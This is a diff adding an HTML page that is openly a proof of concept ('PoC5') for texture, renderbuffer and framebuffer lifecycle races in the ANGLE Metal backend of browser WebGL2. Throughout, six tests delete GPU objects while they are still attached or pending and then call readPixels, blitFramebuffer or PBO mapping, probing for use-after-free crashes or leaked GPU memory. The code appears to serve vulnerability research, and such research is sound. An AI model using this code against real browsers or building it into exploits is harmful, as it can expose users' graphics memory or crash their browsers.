@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head><title>PoC5: Texture Create/Delete + readPixels Race - ANGLE Metal</title></head>
+<body>
+<canvas id="c" width="256" height="256"></canvas>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+  console.log('[POC5] ' + msg);
+}
+
+function getError(gl) {
+  const errs = [];
+  let e;
+  while ((e = gl.getError()) !== gl.NO_ERROR) errs.push('0x' + e.toString(16));
+  return errs.length ? errs.join(',') : 'none';
+}
+
+function createShaderProgram(gl) {
+  const vs = gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs, `#version 300 es
+    in vec4 aPosition;
+    in vec2 aTexCoord;
+    out vec2 vTexCoord;
+    void main() {
+      gl_Position = aPosition;
+      vTexCoord = aTexCoord;
+    }`);
+  gl.compileShader(vs);
+
+  const fs = gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fs, `#version 300 es
+    precision mediump float;
+    in vec2 vTexCoord;
+    uniform sampler2D uSampler;
+    out vec4 fragColor;
+    void main() {
+      fragColor = texture(uSampler, vTexCoord);
+    }`);
+  gl.compileShader(fs);
+
+  const prog = gl.createProgram();
+  gl.attachShader(prog, vs);
+  gl.attachShader(prog, fs);
+  gl.linkProgram(prog);
+  return prog;
+}
+
+async function run() {
+  const canvas = document.getElementById('c');
+  const gl = canvas.getContext('webgl2');
+  if (!gl) { log('FAIL: No WebGL2'); return; }
+
+  log('Renderer: ' + gl.getParameter(gl.RENDERER));
+
+  const prog = createShaderProgram(gl);
+  gl.useProgram(prog);
+
+  // Setup quad
+  const vbo = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, vbo);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
+    -1,-1,0,1, 0,0,  1,-1,0,1, 1,0,  1,1,0,1, 1,1,  -1,1,0,1, 0,1
+  ]), gl.STATIC_DRAW);
+  
+  const posLoc = gl.getAttribLocation(prog, 'aPosition');
+  const tcLoc = gl.getAttribLocation(prog, 'aTexCoord');
+  gl.enableVertexAttribArray(posLoc);
+  gl.vertexAttribPointer(posLoc, 4, gl.FLOAT, false, 24, 0);
+  gl.enableVertexAttribArray(tcLoc);
+  gl.vertexAttribPointer(tcLoc, 2, gl.FLOAT, false, 24, 16);
+
+  const ibo = gl.createBuffer();
+  gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, ibo);
+  gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint16Array([0,1,2,0,2,3]), gl.STATIC_DRAW);
+
+  // Test 1: Create texture, bind to FBO, delete texture, then readPixels
+  log('\n--- Test 1: Delete FBO-attached texture then readPixels ---');
+  for (let i = 0; i < 50; i++) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 256, 256, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    
+    const fbo = gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
+    
+    // Draw something
+    gl.drawElements(gl.TRIANGLES, 6, gl.UNSIGNED_SHORT, 0);
+    
+    // Delete the texture while still attached
+    gl.deleteTexture(tex);
+    
+    // Try to readPixels from the now-deleted texture's FBO
+    const pixels = new Uint8Array(256 * 256 * 4);
+    try {
+      gl.readPixels(0, 0, 256, 256, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+      if (i === 0) log('readPixels after delete: error=' + getError(gl));
+    } catch(e) {
+      if (i === 0) log('readPixels exception: ' + e.message);
+    }
+    
+    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+    gl.deleteFramebuffer(fbo);
+  }
+  log('Test 1 completed 50 iterations');
+
+  // Test 2: Rapid create/delete cycle to exhaust Metal resource pool
+  log('\n--- Test 2: Rapid texture create/delete (1000x) ---');
+  const textures = [];
+  for (let i = 0; i < 1000; i++) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 512, 512, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    textures.push(tex);
+    
+    // Delete some older textures to create fragmentation
+    if (textures.length > 10) {
+      const old = textures.splice(Math.floor(Math.random() * (textures.length - 1)), 1)[0];
+      gl.deleteTexture(old);
+    }
+  }
+  // Clean up remaining
+  for (const t of textures) gl.deleteTexture(t);
+  log('Rapid cycle 1000x: error=' + getError(gl));
+
+  // Test 3: Renderbuffer lifecycle - create, attach, delete, use
+  log('\n--- Test 3: Renderbuffer lifecycle ---');
+  for (let i = 0; i < 50; i++) {
+    const rb = gl.createRenderbuffer();
+    gl.bindRenderbuffer(gl.RENDERBUFFER, rb);
+    gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH24_STENCIL8, 256, 256);
+    
+    const fbo = gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 256, 256, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
+    gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.DEPTH_STENCIL_ATTACHMENT, gl.RENDERBUFFER, rb);
+    
+    // Delete renderbuffer while attached
+    gl.deleteRenderbuffer(rb);
+    
+    // Draw with depth test enabled
+    gl.enable(gl.DEPTH_TEST);
+    gl.drawElements(gl.TRIANGLES, 6, gl.UNSIGNED_SHORT, 0);
+    gl.disable(gl.DEPTH_TEST);
+    
+    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+    gl.deleteFramebuffer(fbo);
+    gl.deleteTexture(tex);
+  }
+  log('Renderbuffer lifecycle 50x: error=' + getError(gl));
+
+  // Test 4: readPixels to PBO with async fence + delete
+  log('\n--- Test 4: Async readPixels via PBO + delete ---');
+  for (let i = 0; i < 30; i++) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 256, 256, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    
+    const fbo = gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
+    
+    gl.drawElements(gl.TRIANGLES, 6, gl.UNSIGNED_SHORT, 0);
+    
+    // Read via PBO
+    const pbo = gl.createBuffer();
+    gl.bindBuffer(gl.PIXEL_PACK_BUFFER, pbo);
+    gl.bufferData(gl.PIXEL_PACK_BUFFER, 256 * 256 * 4, gl.STREAM_READ);
+    gl.readPixels(0, 0, 256, 256, gl.RGBA, gl.UNSIGNED_BYTE, 0);
+    
+    // Create sync object
+    const sync = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
+    gl.flush();
+    
+    // Delete everything immediately (before GPU finishes)
+    gl.deleteTexture(tex);
+    gl.deleteFramebuffer(fbo);
+    
+    // Try to read PBO data anyway
+    gl.bindBuffer(gl.PIXEL_PACK_BUFFER, pbo);
+    const mapped = gl.mapBufferRange(gl.PIXEL_PACK_BUFFER, 0, 256 * 256 * 4, gl.MAP_READ_BIT);
+    if (mapped) {
+      const view = new Uint8Array(mapped);
+      const nonZero = view.some(v => v !== 0);
+      if (i === 0) log('PBO data (nonzero=' + nonZero + '): error=' + getError(gl));
+      gl.unmapBuffer(gl.PIXEL_PACK_BUFFER);
+    } else {
+      if (i === 0) log('PBO map failed: error=' + getError(gl));
+    }
+    
+    gl.deleteSync(sync);
+    gl.deleteBuffer(pbo);
+    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+  }
+  log('Async PBO read+delete 30x: error=' + getError(gl));
+
+  // Test 5: Texture view aliasing (if available)
+  log('\n--- Test 5: Texture with multiple FBO attachments ---');
+  const sharedTex = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, sharedTex);
+  gl.texStorage2D(gl.TEXTURE_2D, 4, gl.RGBA8, 256, 256);
+  
+  const fbos = [];
+  for (let level = 0; level < 4; level++) {
+    const fbo = gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, sharedTex, level);
+    fbos.push(fbo);
+  }
+  
+  // Rapidly switch between FBOs and draw
+  for (let i = 0; i < 200; i++) {
+    const level = i % 4;
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbos[level]);
+    gl.viewport(0, 0, 256 >> level, 256 >> level);
+    gl.drawElements(gl.TRIANGLES, 6, gl.UNSIGNED_SHORT, 0);
+  }
+  log('Mipmap FBO switching 200x: error=' + getError(gl));
+  
+  // Delete shared texture while FBOs still reference it
+  gl.deleteTexture(sharedTex);
+  
+  // Try drawing to deleted texture's FBO
+  for (const fbo of fbos) {
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    gl.drawElements(gl.TRIANGLES, 6, gl.UNSIGNED_SHORT, 0);
+  }
+  log('Draw after shared tex delete: error=' + getError(gl));
+  
+  for (const fbo of fbos) gl.deleteFramebuffer(fbo);
+  gl.viewport(0, 0, 256, 256);
+
+  // Test 6: blitFramebuffer with deleted source
+  log('\n--- Test 6: blitFramebuffer lifecycle race ---');
+  const srcTex = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, srcTex);
+  gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 256, 256, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+  
+  const srcFbo = gl.createFramebuffer();
+  gl.bindFramebuffer(gl.READ_FRAMEBUFFER, srcFbo);
+  gl.framebufferTexture2D(gl.READ_FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, srcTex, 0);
+
+  const dstTex = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, dstTex);
+  gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 256, 256, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+  
+  const dstFbo = gl.createFramebuffer();
+  gl.bindFramebuffer(gl.DRAW_FRAMEBUFFER, dstFbo);
+  gl.framebufferTexture2D(gl.DRAW_FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, dstTex, 0);
+
+  // Delete source texture
+  gl.deleteTexture(srcTex);
+  
+  // Try blit with deleted source
+  try {
+    gl.blitFramebuffer(0, 0, 256, 256, 0, 0, 256, 256, gl.COLOR_BUFFER_BIT, gl.NEAREST);
+    log('Blit after src delete: error=' + getError(gl));
+  } catch(e) {
+    log('Blit exception: ' + e.message);
+  }
+
+  gl.deleteTexture(dstTex);
+  gl.deleteFramebuffer(srcFbo);
+  gl.deleteFramebuffer(dstFbo);
+  gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+
+  log('\n=== PoC5 Complete ===');
+}
+
+run().catch(e => log('FATAL: ' + e.message + '\n' + e.stack));
+</script>
+</body>
+</html>
